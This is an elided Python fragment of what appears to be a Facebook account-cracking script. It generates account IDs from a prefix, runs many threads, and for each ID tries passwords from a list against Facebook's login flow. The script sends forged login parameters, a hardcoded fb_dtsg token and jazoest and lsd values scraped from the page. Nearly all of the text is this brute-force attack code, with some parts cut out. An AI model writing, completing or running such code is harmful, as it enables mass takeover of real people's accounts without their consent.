...
def ___random_main___():
    ...
    with tred(max_workers=speed) as executor:
        ...
        print(f'    {W}[{Y}✓{W}] SPEED {W}:[{G} {speed} {W}] ')
        linex()
        for love in user:
            ids = code + love
            if mtd == "1":
...
def _TEAM_RANDOM_M1(ids):
    ...
    try:
        for pw in plist:
            ...
            '__a': '1',
            '__req': '5',
            '__hs': '20474.BP:wbloks_caa_pkg.2.0...0',
            'dpr': '3',
            '__ccg': 'EXCELLENT',
            '__rev': str(random.randint(1000000000,1999999999)),
            '__s': '4d1yuz:f09jwj:1vmn5v',
            ...
            'fb_dtsg': 'NAfstpCbzQRYPWgFXdSg7hzza1bqJ5ThFScxZm8U1R8GvwaXncxCLhA:0:0',
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(link)).group(1), 
            'lsd': re.search('name="lsd" value="(.*?)"', str(link)).group(1), 
            'params': '{"params":"{\"server_params\":{\"transparency_event_type\":\"affirmative_action\",\"header_transparency_event_name\":\"login_button_clicked\",\"header_transparency_event_location\":\"login\",\"headers_flow_id\":\"fb3e2ffc-b072-49e9-ba07-1e3e17b900a3\",\"INTERNAL__latency_qpl_marker_id\":36707139,\"INTERNAL__latency_qpl_instance_id\":\"87858486100251\",\"device_id\":null,\"family_device_id\":null,\"waterfall_id\":\"dd043028-5135-4991-a40b-6ac0031c5d93\",\"offline_experiment_group\":null,\"layered_homepage_experiment_group\":null,\"is_platform_login\":0,\"is_from_logged_in_switcher\":0,\"is_from_logged_out\":0,\"access_flow_version\":\"pre_mt_behavior\"},\"client_input_params\":{\"zero_balance_state\":\"\",\"network_bssid\":null,\"lois_settings\":{\"lois_token\":\"\"},\"aac\":\"\"}}"}',
}     
